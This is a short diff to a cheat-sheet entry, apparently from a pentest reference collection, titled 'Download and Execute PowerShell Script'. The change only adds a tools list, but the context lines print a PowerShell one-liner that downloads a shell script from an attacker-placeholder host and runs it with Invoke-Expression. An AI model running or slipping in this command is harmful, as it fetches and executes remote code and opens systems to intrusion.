@@ -7,6 +7,9 @@ data: Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_ATTA
 output: PS C:\> Invoke-Expression (New-Object Net.WebClient).downloadString("http://10.10.10.100/shell.ps1")
 created_at: '2019-11-26T00:02:47.375110+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Powershell]]'
+- '[[ps]]'
 ---
 
 # Download and Execute PowerShell Script (Invoke-Expression)
